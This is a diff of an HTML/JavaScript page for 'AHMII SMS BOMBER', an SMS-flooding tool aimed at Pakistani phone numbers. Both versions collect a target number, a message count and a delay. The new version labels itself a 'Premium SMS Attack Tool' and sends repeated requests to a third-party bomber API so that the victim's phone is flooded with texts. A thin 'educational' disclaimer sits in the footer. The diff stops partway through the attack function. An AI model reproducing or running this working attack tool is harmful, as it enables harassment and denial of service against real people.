@@ -3,10 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <meta name="author" content="AHMII">
-    <meta name="copyright" content="AHMII 2026">
-    <title>✦ AHMII | SMS BOMBER ✦ Luxury Edition 2026</title>
-    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;500;600;700;800;900&family=Montserrat:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <title>💀 AHMII SMS BOMBER | Premium SMS Attack Tool 💀</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
     <style>
         * {
@@ -16,703 +14,833 @@
         }
 
         body {
-            font-family: 'Montserrat', sans-serif;
-            background: linear-gradient(145deg, #0a0a0f 0%, #050508 100%);
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, #0a0f1e 0%, #0d1525 50%, #0a0f1e 100%);
             min-height: 100vh;
             overflow-x: hidden;
             position: relative;
         }
 
-        /* Luxury Animated Background */
-        .luxury-bg {
+        /* Animated Background Grid */
+        .grid-bg {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
+            background-image: 
+                linear-gradient(rgba(0, 255, 136, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 255, 136, 0.03) 1px, transparent 1px);
+            background-size: 50px 50px;
             z-index: 0;
-        }
-        
-        .luxury-bg::before {
-            content: '';
-            position: absolute;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(ellipse at 30% 40%, rgba(212, 175, 55, 0.08) 0%, transparent 50%),
-                        radial-gradient(ellipse at 70% 60%, rgba(212, 175, 55, 0.05) 0%, transparent 50%);
-            animation: slowDrift 30s infinite ease-in-out;
-        }
-        
-        @keyframes slowDrift {
-            0%, 100% { transform: translate(0, 0); }
-            33% { transform: translate(-2%, -2%); }
-            66% { transform: translate(2%, 2%); }
+            pointer-events: none;
         }
 
-        /* Floating Gold Orbs */
-        .gold-orb {
+        /* Glowing Orbs */
+        .orb {
             position: fixed;
             border-radius: 50%;
-            filter: blur(90px);
-            opacity: 0.15;
-            pointer-events: none;
+            filter: blur(80px);
+            opacity: 0.4;
             z-index: 0;
+            pointer-events: none;
+            animation: float 20s infinite ease-in-out;
         }
-        .orb1 {
+
+        .orb-1 {
+            width: 400px;
+            height: 400px;
+            background: radial-gradient(circle, rgba(0, 255, 136, 0.8), transparent);
+            top: -150px;
+            right: -150px;
+            animation-delay: 0s;
+        }
+
+        .orb-2 {
             width: 500px;
             height: 500px;
-            background: radial-gradient(circle, rgba(212, 175, 55, 0.6), transparent);
-            top: -200px;
-            right: -200px;
-            animation: floatGold 25s infinite;
+            background: radial-gradient(circle, rgba(139, 92, 246, 0.6), transparent);
+            bottom: -200px;
+            left: -200px;
+            animation-delay: 5s;
         }
-        .orb2 {
-            width: 450px;
-            height: 450px;
-            background: radial-gradient(circle, rgba(212, 175, 55, 0.4), transparent);
-            bottom: -180px;
-            left: -180px;
-            animation: floatGold 30s infinite reverse;
+
+        .orb-3 {
+            width: 300px;
+            height: 300px;
+            background: radial-gradient(circle, rgba(59, 130, 246, 0.5), transparent);
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            animation-delay: 10s;
         }
-        @keyframes floatGold {
+
+        @keyframes float {
             0%, 100% { transform: translate(0, 0) scale(1); }
-            50% { transform: translate(30px, -30px) scale(1.2); }
+            33% { transform: translate(30px, -30px) scale(1.1); }
+            66% { transform: translate(-20px, 20px) scale(0.9); }
         }
 
         /* Main Container */
         .container {
             position: relative;
-            z-index: 20;
-            max-width: 560px;
+            z-index: 10;
+            max-width: 550px;
             margin: 0 auto;
-            padding: 28px;
+            padding: 20px;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
             justify-content: center;
         }
 
-        /* Header - Luxury Style */
+        /* Header Section */
         .header {
             text-align: center;
-            margin-bottom: 45px;
+            margin-bottom: 40px;
+            animation: fadeInDown 0.8s ease;
         }
-        
-        .logo-icon {
+
+        .logo {
             font-size: 3.5rem;
-            color: #D4AF37;
-            text-shadow: 0 0 20px rgba(212, 175, 55, 0.4);
-            margin-bottom: 15px;
-            display: inline-block;
-            animation: gentleGlow 3s infinite;
-        }
-        
-        @keyframes gentleGlow {
-            0%, 100% { text-shadow: 0 0 10px rgba(212, 175, 55, 0.3); }
-            50% { text-shadow: 0 0 25px rgba(212, 175, 55, 0.6); }
-        }
-        
-        .logo-text {
-            font-family: 'Playfair Display', serif;
-            font-size: 2.4rem;
-            font-weight: 800;
-            letter-spacing: 2px;
-            background: linear-gradient(135deg, #D4AF37 0%, #F3E5AB 50%, #D4AF37 100%);
+            font-weight: 900;
+            background: linear-gradient(135deg, #00ff88, #00cc66, #00994d);
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
-            margin-bottom: 12px;
-        }
-        
-        .logo-sub {
-            font-size: 0.7rem;
-            letter-spacing: 4px;
-            color: rgba(212, 175, 55, 0.6);
-            text-transform: uppercase;
-            font-weight: 300;
-        }
-        
-        .divider {
-            width: 60px;
-            height: 2px;
-            background: linear-gradient(90deg, transparent, #D4AF37, transparent);
-            margin: 20px auto 0;
+            text-shadow: 0 0 30px rgba(0, 255, 136, 0.3);
+            letter-spacing: 2px;
         }
 
-        /* Premium Card - Pure Luxury */
-        .luxury-card {
-            background: rgba(8, 8, 14, 0.75);
-            backdrop-filter: blur(30px);
-            border-radius: 56px;
-            padding: 42px 36px;
-            border: 1px solid rgba(212, 175, 55, 0.25);
-            box-shadow: 0 35px 60px -25px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(212, 175, 55, 0.1) inset;
-            transition: all 0.4s ease;
-        }
-        
-        .luxury-card:hover {
-            border-color: rgba(212, 175, 55, 0.5);
-            box-shadow: 0 40px 70px -25px rgba(212, 175, 55, 0.15), 0 0 0 1px rgba(212, 175, 55, 0.2) inset;
+        .logo i {
+            background: linear-gradient(135deg, #00ff88, #00cc66);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            font-size: 3rem;
         }
 
-        /* Input Groups - Elegant */
+        .badge {
+            display: inline-block;
+            background: rgba(0, 255, 136, 0.15);
+            backdrop-filter: blur(10px);
+            padding: 8px 20px;
+            border-radius: 50px;
+            margin-top: 15px;
+            border: 1px solid rgba(0, 255, 136, 0.3);
+        }
+
+        .badge span {
+            color: #00ff88;
+            font-weight: 600;
+            font-size: 0.85rem;
+        }
+
+        .badge i {
+            margin-right: 8px;
+            color: #00ff88;
+        }
+
+        /* Premium Card */
+        .premium-card {
+            background: rgba(10, 20, 30, 0.6);
+            backdrop-filter: blur(20px);
+            border-radius: 40px;
+            padding: 35px 30px;
+            border: 1px solid rgba(0, 255, 136, 0.2);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(0, 255, 136, 0.1) inset;
+            animation: fadeInUp 0.8s ease;
+            transition: all 0.3s ease;
+        }
+
+        .premium-card:hover {
+            border-color: rgba(0, 255, 136, 0.5);
+            box-shadow: 0 30px 60px -12px rgba(0, 255, 136, 0.2), 0 0 0 1px rgba(0, 255, 136, 0.2) inset;
+        }
+
+        /* Input Group */
         .input-group {
-            margin-bottom: 28px;
+            margin-bottom: 25px;
         }
-        
+
         .input-label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: 600;
+            color: rgba(255, 255, 255, 0.8);
+            letter-spacing: 0.5px;
+        }
+
+        .input-label i {
+            color: #00ff88;
+            margin-right: 10px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 16px 20px;
+            background: rgba(0, 0, 0, 0.4);
+            border: 1.5px solid rgba(0, 255, 136, 0.2);
+            border-radius: 20px;
+            color: white;
+            font-size: 1rem;
+            font-family: 'Poppins', monospace;
+            transition: all 0.3s ease;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: #00ff88;
+            box-shadow: 0 0 20px rgba(0, 255, 136, 0.2);
+            background: rgba(0, 0, 0, 0.6);
+        }
+
+        .input-field::placeholder {
+            color: rgba(255, 255, 255, 0.3);
+        }
+
+        /* Country Code Preview */
+        .country-preview {
             display: flex;
             align-items: center;
             gap: 10px;
-            margin-bottom: 12px;
-            font-size: 0.75rem;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            color: rgba(255, 255, 255, 0.6);
+            margin-top: 8px;
+            font-size: 0.8rem;
+            color: rgba(0, 255, 136, 0.7);
         }
-        
-        .input-label i {
-            color: #D4AF37;
-            font-size: 0.9rem;
-        }
-        
-        .input-field {
-            width: 100%;
-            padding: 16px 24px;
-            background: rgba(0, 0, 0, 0.45);
-            border: 1.5px solid rgba(212, 175, 55, 0.2);
-            border-radius: 60px;
-            color: white;
+
+        .country-preview i {
             font-size: 1rem;
-            font-weight: 500;
-            font-family: 'Montserrat', monospace;
-            transition: all 0.25s;
-        }
-        
-        .input-field:focus {
-            outline: none;
-            border-color: #D4AF37;
-            box-shadow: 0 0 20px rgba(212, 175, 55, 0.15);
-            background: rgba(0, 0, 0, 0.6);
-        }
-        
-        .input-field::placeholder {
-            color: rgba(255, 255, 255, 0.2);
-            font-weight: 400;
         }
 
-        /* Format Options - Gold Accents */
-        .format-row {
-            display: flex;
-            gap: 12px;
-            margin-top: 14px;
-            justify-content: center;
-        }
-        
-        .format-option {
-            background: rgba(212, 175, 55, 0.06);
-            padding: 7px 18px;
-            border-radius: 60px;
-            font-size: 0.7rem;
-            font-weight: 500;
-            letter-spacing: 1px;
-            color: rgba(212, 175, 55, 0.8);
-            border: 0.5px solid rgba(212, 175, 55, 0.2);
-            cursor: pointer;
-            transition: 0.25s;
-        }
-        
-        .format-option:hover {
-            background: rgba(212, 175, 55, 0.15);
-            border-color: rgba(212, 175, 55, 0.6);
-        }
-
-        /* Buttons - Royal Style */
+        /* Button Group */
         .btn-group {
             display: flex;
-            gap: 18px;
-            margin-top: 36px;
+            gap: 15px;
+            margin-top: 30px;
         }
-        
+
         .btn {
             flex: 1;
-            padding: 16px 18px;
+            padding: 16px 20px;
             border: none;
-            border-radius: 80px;
-            font-size: 0.85rem;
+            border-radius: 30px;
+            font-size: 1rem;
             font-weight: 700;
-            text-transform: uppercase;
-            letter-spacing: 2px;
             cursor: pointer;
             transition: all 0.3s ease;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 10px;
-            font-family: 'Montserrat', sans-serif;
+            font-family: 'Poppins', sans-serif;
         }
-        
+
         .btn-primary {
-            background: linear-gradient(135deg, #D4AF37, #B8960F, #D4AF37);
-            background-size: 200% auto;
-            color: #0a0a0f;
-            box-shadow: 0 5px 20px rgba(212, 175, 55, 0.35);
+            background: linear-gradient(135deg, #00ff88, #00cc66);
+            color: #0a0f1e;
+            box-shadow: 0 10px 25px -5px rgba(0, 255, 136, 0.4);
         }
-        
+
         .btn-primary:hover:not(:disabled) {
             transform: translateY(-3px);
-            box-shadow: 0 12px 28px rgba(212, 175, 55, 0.5);
-            background-position: 100% 0;
-        }
-        
-        .btn-secondary {
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(212, 175, 55, 0.3);
-            color: rgba(212, 175, 55, 0.9);
-        }
-        
-        .btn-secondary:hover:not(:disabled) {
-            background: rgba(212, 175, 55, 0.1);
-            border-color: #D4AF37;
-        }
-        
-        .btn:disabled {
-            opacity: 0.4;
-            cursor: not-allowed;
+            box-shadow: 0 20px 35px -8px rgba(0, 255, 136, 0.5);
         }
 
-        /* Elegant Progress */
-        .progress-elegant {
-            margin-top: 32px;
+        .btn-primary:active:not(:disabled) {
+            transform: translateY(1px);
+        }
+
+        .btn-danger {
+            background: linear-gradient(135deg, #ff4757, #c0392b);
+            color: white;
+            box-shadow: 0 10px 25px -5px rgba(255, 71, 87, 0.3);
+        }
+
+        .btn-danger:hover:not(:disabled) {
+            transform: translateY(-3px);
+            box-shadow: 0 20px 35px -8px rgba(255, 71, 87, 0.4);
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* Progress Section */
+        .progress-section {
+            margin-top: 30px;
             display: none;
         }
-        
-        .progress-track {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 60px;
-            height: 3px;
+
+        .progress-bar-container {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50px;
+            height: 8px;
             overflow: hidden;
         }
-        
-        .progress-fill {
-            background: linear-gradient(90deg, #D4AF37, #F3E5AB);
+
+        .progress-bar {
+            background: linear-gradient(90deg, #00ff88, #00cc66);
             width: 0%;
             height: 100%;
-            border-radius: 60px;
-            transition: width 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            border-radius: 50px;
+            transition: width 0.3s ease;
+            position: relative;
+            overflow: hidden;
         }
-        
-        .progress-numbers {
+
+        .progress-bar::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            animation: shimmer 1.5s infinite;
+        }
+
+        @keyframes shimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+
+        .progress-stats {
             display: flex;
             justify-content: space-between;
-            margin-top: 14px;
-            font-size: 0.7rem;
-            color: rgba(255, 255, 255, 0.45);
-            letter-spacing: 1px;
+            margin-top: 12px;
+            font-size: 0.8rem;
+            color: rgba(255, 255, 255, 0.6);
         }
 
-        /* Beautiful Message Toast */
-        .message-toast {
-            margin-top: 24px;
-            padding: 16px 24px;
-            border-radius: 60px;
+        /* Result Alert */
+        .result-alert {
+            margin-top: 25px;
+            padding: 15px 20px;
+            border-radius: 20px;
             display: none;
             align-items: center;
-            gap: 14px;
-            animation: slideUp 0.4s ease;
-            font-size: 0.85rem;
-            font-weight: 500;
-        }
-        
-        .message-toast.show {
-            display: flex;
-        }
-        
-        .message-toast.success {
-            background: rgba(212, 175, 55, 0.12);
-            border: 0.5px solid rgba(212, 175, 55, 0.4);
-            color: #F3E5AB;
-        }
-        
-        .message-toast.error {
-            background: rgba(180, 100, 100, 0.1);
-            border: 0.5px solid rgba(180, 100, 100, 0.3);
-            color: #E8C8C8;
-        }
-        
-        .message-toast i {
-            font-size: 1.2rem;
-        }
-        
-        .message-toast.success i { color: #D4AF37; }
-        
-        @keyframes slideUp {
-            from { opacity: 0; transform: translateY(12px); }
-            to { opacity: 1; transform: translateY(0); }
+            gap: 12px;
+            animation: slideIn 0.4s ease;
         }
 
-        /* Simple Log - Minimal Elegance */
-        .log-elegant {
-            margin-top: 28px;
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 48px;
-            padding: 16px 20px;
-            max-height: 130px;
-            overflow-y: auto;
-            font-size: 0.7rem;
-            font-family: 'Montserrat', monospace;
-            border: 0.5px solid rgba(212, 175, 55, 0.1);
+        .result-alert.success {
+            background: rgba(0, 255, 136, 0.15);
+            border: 1px solid rgba(0, 255, 136, 0.4);
+            display: flex;
         }
-        
-        .log-line {
-            padding: 6px 0;
-            border-bottom: 0.5px solid rgba(255, 255, 255, 0.02);
-            color: rgba(255, 255, 255, 0.6);
+
+        .result-alert.error {
+            background: rgba(255, 71, 87, 0.15);
+            border: 1px solid rgba(255, 71, 87, 0.4);
+            display: flex;
+        }
+
+        .result-alert i {
+            font-size: 1.5rem;
+        }
+
+        .result-alert.success i {
+            color: #00ff88;
+        }
+
+        .result-alert.error i {
+            color: #ff4757;
+        }
+
+        .result-alert .result-text {
+            flex: 1;
+            font-size: 0.9rem;
+            font-weight: 500;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Features Section */
+        .features {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 35px;
+            flex-wrap: wrap;
+        }
+
+        .feature-item {
             display: flex;
             align-items: center;
-            gap: 10px;
+            gap: 8px;
+            font-size: 0.75rem;
+            color: rgba(255, 255, 255, 0.5);
         }
-        
-        .log-line.delivered { color: #D4AF37; }
-        .log-line.failed { color: rgba(200, 120, 120, 0.8); }
-        .log-line i { width: 20px; font-size: 0.7rem; }
+
+        .feature-item i {
+            color: #00ff88;
+            font-size: 0.9rem;
+        }
 
         /* Footer */
         .footer {
             text-align: center;
-            margin-top: 48px;
-            font-size: 0.6rem;
-            color: rgba(255, 255, 255, 0.2);
-            border-top: 0.5px solid rgba(212, 175, 55, 0.08);
-            padding-top: 28px;
-            letter-spacing: 1px;
+            margin-top: 40px;
+            padding-top: 20px;
+            font-size: 0.7rem;
+            color: rgba(255, 255, 255, 0.3);
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
         }
-        
-        .footer .gold {
-            color: #D4AF37;
-            font-weight: 600;
+
+        /* Animations */
+        @keyframes fadeInDown {
+            from {
+                opacity: 0;
+                transform: translateY(-30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Pulse Animation for Active */
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .attacking {
+            animation: pulse 1s infinite;
         }
 
         /* Responsive */
-        @media (max-width: 520px) {
-            .container { padding: 20px; }
-            .luxury-card { padding: 32px 24px; }
-            .logo-text { font-size: 1.8rem; }
-            .btn-group { flex-direction: column; gap: 12px; }
+        @media (max-width: 550px) {
+            .container {
+                padding: 15px;
+            }
+            .premium-card {
+                padding: 25px 20px;
+            }
+            .logo {
+                font-size: 2.2rem;
+            }
+            .logo i {
+                font-size: 2rem;
+            }
+            .btn-group {
+                flex-direction: column;
+            }
+            .btn {
+                padding: 14px;
+            }
         }
 
-        /* Attack Pulse */
-        @keyframes royalPulse {
-            0% { border-color: rgba(212, 175, 55, 0.2); }
-            50% { border-color: rgba(212, 175, 55, 0.7); box-shadow: 0 0 0 6px rgba(212, 175, 55, 0.05); }
-            100% { border-color: rgba(212, 175, 55, 0.2); }
-        }
-        
-        .attacking {
-            animation: royalPulse 1.3s infinite;
-        }
-        
-        /* Hide scrollbar but keep functionality */
-        .log-elegant::-webkit-scrollbar {
-            width: 4px;
-        }
-        .log-elegant::-webkit-scrollbar-track {
-            background: rgba(255,255,255,0.05);
-            border-radius: 10px;
-        }
-        .log-elegant::-webkit-scrollbar-thumb {
-            background: #D4AF37;
-            border-radius: 10px;
+        /* Custom Number Input Arrows */
+        input[type=number]::-webkit-inner-spin-button, 
+        input[type=number]::-webkit-outer-spin-button {
+            opacity: 0.5;
         }
     </style>
 </head>
 <body>
 
-<div class="luxury-bg"></div>
-<div class="gold-orb orb1"></div>
-<div class="gold-orb orb2"></div>
+<div class="grid-bg"></div>
+<div class="orb orb-1"></div>
+<div class="orb orb-2"></div>
+<div class="orb orb-3"></div>
 
 <div class="container">
     <div class="header">
-        <div class="logo-icon">
-            <i class="fas fa-crown"></i>
+        <div class="logo">
+            <i class="fas fa-bomb"></i> AHMII SMS<br>BOMBER
         </div>
-        <div class="logo-text">AHMII BOMBER</div>
-        <div class="logo-sub">SMS SECURITY FRAMEWORK</div>
-        <div class="divider"></div>
+        <div class="badge">
+            <i class="fas fa-shield-alt"></i>
+            <span>PREMIUM SMS ATTACK TOOL</span>
+            <i class="fas fa-skull"></i>
+        </div>
     </div>
 
-    <div class="luxury-card">
+    <div class="premium-card">
         <div class="input-group">
-            <div class="input-label"><i class="fas fa-phone-alt"></i> TARGET NUMBER</div>
-            <input type="text" id="targetPhone" class="input-field" placeholder="923021234865" value="923021234865">
-            <div class="format-row">
-                <div class="format-option" data-val="92">🇵🇰 92XXXXXXXXXX</div>
-                <div class="format-option" data-val="03">📱 03XXXXXXXXX</div>
-                <div class="format-option" data-val="clear">🗑️ CLEAR</div>
+            <div class="input-label">
+                <i class="fas fa-mobile-alt"></i> TARGET NUMBER
+            </div>
+            <input type="tel" id="phoneNumber" class="input-field" placeholder="03xxxxxxxxx" value="" maxlength="11">
+            <div class="country-preview">
+                <i class="fas fa-flag-pakistan"></i>
+                <span>Pakistan Format: 03XXXXXXXXX (11 digits, without +92)</span>
             </div>
         </div>
 
         <div class="input-group">
-            <div class="input-label"><i class="fas fa-bolt"></i> MESSAGES</div>
-            <input type="number" id="msgQty" class="input-field" value="10" min="1" max="80">
+            <div class="input-label">
+                <i class="fas fa-bolt"></i> MESSAGE QUANTITY
+            </div>
+            <input type="number" id="messageAmount" class="input-field" placeholder="Number of SMS to send" value="10" min="1" max="200">
         </div>
 
         <div class="input-group">
-            <div class="input-label"><i class="fas fa-hourglass-half"></i> DELAY (MS)</div>
-            <input type="number" id="msgDelayMs" class="input-field" value="600" min="300" max="2500">
+            <div class="input-label">
+                <i class="fas fa-hourglass-half"></i> DELAY (MILLISECONDS)
+            </div>
+            <input type="number" id="delayTime" class="input-field" placeholder="Delay between messages" value="500" min="100" max="5000">
         </div>
 
         <div class="btn-group">
-            <button id="launchBtn" class="btn btn-primary"><i class="fas fa-feather-alt"></i> LAUNCH</button>
-            <button id="stopBtn" class="btn btn-secondary" disabled><i class="fas fa-ban"></i> ABORT</button>
+            <button id="startBtn" class="btn btn-primary">
+                <i class="fas fa-play"></i> LAUNCH ATTACK
+            </button>
+            <button id="stopBtn" class="btn btn-danger" disabled>
+                <i class="fas fa-stop"></i> STOP
+            </button>
         </div>
 
-        <div class="progress-elegant" id="progressPanel">
-            <div class="progress-track"><div class="progress-fill" id="progressFill"></div></div>
-            <div class="progress-numbers">
-                <span><i class="far fa-envelope"></i> <span id="sentAmount">0</span>/<span id="totalAmount">0</span></span>
-                <span><i class="fas fa-check"></i> <span id="doneCount">0</span></span>
+        <div class="progress-section" id="progressSection">
+            <div class="progress-bar-container">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            <div class="progress-stats">
+                <span id="sentCount">0</span>
+                <span id="totalCount">0</span>
             </div>
         </div>
 
-        <div id="statusToast" class="message-toast"></div>
-
-        <div class="log-elegant" id="elegantLog">
-            <div class="log-line"><i class="fas fa-info-circle"></i> AHMII system ready — enter target</div>
+        <div id="resultAlert" class="result-alert">
+            <i class="fas"></i>
+            <span class="result-text"></span>
         </div>
     </div>
 
+    <div class="features">
+        <div class="feature-item"><i class="fas fa-bolt"></i> High Speed</div>
+        <div class="feature-item"><i class="fas fa-shield-alt"></i> Secure API</div>
+        <div class="feature-item"><i class="fas fa-infinity"></i> Unlimited</div>
+        <div class="feature-item"><i class="fas fa-chart-line"></i> Real-time Stats</div>
+    </div>
+
     <div class="footer">
-        <p>✦ <span class="gold">AHMII</span> • CYBER SECURITY DIVISION • 2026 ✦</p>
-        <p>premium testing framework</p>
+        <p><i class="fas fa-exclamation-triangle"></i> For Educational & Security Testing Only</p>
+        <p>© 2026 AHMII SMS BOMBER | Premium Tool</p>
     </div>
 </div>
 
 <script>
     // DOM Elements
-    const launchButton = document.getElementById('launchBtn');
-    const abortButton = document.getElementById('stopBtn');
-    const phoneField = document.getElementById('targetPhone');
-    const quantityField = document.getElementById('msgQty');
-    const delayField = document.getElementById('msgDelayMs');
-    const progressPanel = document.getElementById('progressPanel');
-    const progressFill = document.getElementById('progressFill');
-    const sentSpan = document.getElementById('sentAmount');
-    const totalSpan = document.getElementById('totalAmount');
-    const doneSpan = document.getElementById('doneCount');
-    const toastDiv = document.getElementById('statusToast');
-    const logContainer = document.getElementById('elegantLog');
+    const startBtn = document.getElementById('startBtn');
+    const stopBtn = document.getElementById('stopBtn');
+    const phoneInput = document.getElementById('phoneNumber');
+    const amountInput = document.getElementById('messageAmount');
+    const delayInput = document.getElementById('delayTime');
+    const progressSection = document.getElementById('progressSection');
+    const progressBar = document.getElementById('progressBar');
+    const sentCountSpan = document.getElementById('sentCount');
+    const totalCountSpan = document.getElementById('totalCount');
+    const resultAlert = document.getElementById('resultAlert');
+    const resultIcon = resultAlert.querySelector('i');
+    const resultText = resultAlert.querySelector('.result-text');
 
-    // State
-    let isActive = false;
-    let stopSignal = false;
-    let sent = 0, delivered = 0;
-    let total = 0;
-    let activeTimout = null;
+    // State Variables
+    let isAttacking = false;
+    let currentRequest = null;
+    let sentMessages = 0;
+    let totalMessages = 0;
 
-    const API_BASE = 'https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=';
+    // API Base URL
+    const API_BASE_URL = 'https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=';
 
-    // Helper: Show toast
-    function displayToast(msg, isOk = true) {
-        toastDiv.className = `message-toast ${isOk ? 'success' : 'error'} show`;
-        toastDiv.innerHTML = `<i class="fas ${isOk ? 'fa-gem' : 'fa-skull'}"></i><span>${msg}</span>`;
-        setTimeout(() => toastDiv.classList.remove('show'), 3500);
+    // Helper Functions
+    function showResult(message, type) {
+        resultAlert.className = `result-alert ${type}`;
+        if (type === 'success') {
+            resultIcon.className = 'fas fa-check-circle';
+        } else {
+            resultIcon.className = 'fas fa-exclamation-triangle';
+        }
+        resultText.textContent = message;
+        
+        // Auto hide after 5 seconds
+        setTimeout(() => {
+            if (resultAlert.className.includes(type)) {
+                resultAlert.style.display = 'none';
+                resultAlert.className = 'result-alert';
+            }
+        }, 5000);
     }
 
-    // Add log entry
-    function addLogEntry(text, isDelivered = true) {
-        const line = document.createElement('div');
-        line.className = `log-line ${isDelivered ? 'delivered' : 'failed'}`;
-        line.innerHTML = `<i class="fas ${isDelivered ? 'fa-crown' : 'fa-times'}"></i> ${text}`;
-        logContainer.appendChild(line);
-        line.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
-        while (logContainer.children.length > 45) logContainer.removeChild(logContainer.firstChild);
+    function hideResult() {
+        resultAlert.style.display = 'none';
+        resultAlert.className = 'result-alert';
     }
 
-    function clearLog() {
-        logContainer.innerHTML = '<div class="log-line"><i class="fas fa-info-circle"></i> attack started — tracking messages...</div>';
+    function updateProgress() {
+        const percentage = (sentMessages / totalMessages) * 100;
+        progressBar.style.width = `${percentage}%`;
+        sentCountSpan.textContent = sentMessages;
+        totalCountSpan.textContent = totalMessages;
     }
 
-    // Convert number to intl format
-    function toInternational(raw) {
-        let clean = raw.replace(/\D/g, '');
-        if (clean.startsWith('03') && clean.length === 11) return '92' + clean.slice(1);
-        if (clean.startsWith('3') && clean.length === 10) return '92' + clean;
-        if (clean.startsWith('92') && clean.length === 12) return clean;
-        if (clean.startsWith('92') && clean.length > 12) return clean.slice(0,12);
-        return clean;
+    function resetProgress() {
+        sentMessages = 0;
+        totalMessages = 0;
+        updateProgress();
+        progressSection.style.display = 'none';
     }
 
-    function isValidInternational(num) {
-        return /^92[0-9]{10}$/.test(num);
+    function validateNumber(number) {
+        // Pakistan number validation: 03 followed by 9 digits (total 11 digits)
+        const pakistanRegex = /^03[0-9]{9}$/;
+        if (!pakistanRegex.test(number)) {
+            showResult('❌ Invalid Pakistani number! Use format: 03XXXXXXXXX (11 digits starting with 03)', 'error');
+            return false;
+        }
+        return true;
     }
 
-    // Single API request
-    async function sendOne(number, idx) {
+    function validateAmount(amount) {
+        if (isNaN(amount) || amount < 1) {
+            showResult('❌ Message amount must be at least 1', 'error');
+            return false;
+        }
+        if (amount > 200) {
+            showResult('⚠️ Maximum 200 messages per session for safety', 'error');
+            return false;
+        }
+        return true;
+    }
+
+    function validateDelay(delay) {
+        if (isNaN(delay) || delay < 100) {
+            showResult('⚠️ Delay must be at least 100ms', 'error');
+            return false;
+        }
+        if (delay > 5000) {
+            showResult('⚠️ Delay maximum is 5000ms', 'error');
+            return false;
+        }
+        return true;
+    }
+
+    async function sendSingleMessage(number, index) {
+        // Convert 03xx format to 92xx format for API
+        const convertedNumber = '92' + number.substring(1);
+        const url = `${API_BASE_URL}${convertedNumber}`;
+        
         try {
-            const ctrl = new AbortController();
-            const timer = setTimeout(() => ctrl.abort(), 13000);
-            const res = await fetch(API_BASE + number, { signal: ctrl.signal });
-            clearTimeout(timer);
-            const text = await res.text();
-            const ok = res.ok || text.includes('success') || text.includes('sent') || text.includes('delivered');
-            return { success: ok, raw: text };
-        } catch (err) {
-            return { success: false, error: err.message };
-        }
-    }
-
-    function updateProgressBar() {
-        const percent = total ? (sent / total) * 100 : 0;
-        progressFill.style.width = `${percent}%`;
-        sentSpan.innerText = sent;
-        totalSpan.innerText = total;
-        doneSpan.innerText = delivered;
-    }
-
-    function resetUI() {
-        isActive = false;
-        stopSignal = false;
-        if (activeTimout) clearTimeout(activeTimout);
-        launchButton.disabled = false;
-        abortButton.disabled = true;
-        phoneField.disabled = false;
-        quantityField.disabled = false;
-        delayField.disabled = false;
-        document.querySelector('.luxury-card')?.classList.remove('attacking');
-    }
-
-    async function beginAttack() {
-        if (isActive) return;
-
-        let rawNumber = phoneField.value.trim();
-        let amount = parseInt(quantityField.value);
-        let delayVal = parseInt(delayField.value);
-
-        if (!rawNumber) {
-            displayToast('Enter target number', false);
-            return;
-        }
-
-        const intlNumber = toInternational(rawNumber);
-        if (!isValidInternational(intlNumber)) {
-            displayToast('Use 92XXXXXXXXXX or 03XXXXXXXXX', false);
-            return;
-        }
-
-        phoneField.value = intlNumber;
-
-        if (isNaN(amount) || amount < 1) amount = 5;
-        if (amount > 80) amount = 80;
-        if (isNaN(delayVal)) delayVal = 600;
-        if (delayVal < 300) delayVal = 300;
-        if (delayVal > 2500) delayVal = 2500;
-
-        // reset state
-        isActive = true;
-        stopSignal = false;
-        sent = 0;
-        delivered = 0;
-        total = amount;
-
-        launchButton.disabled = true;
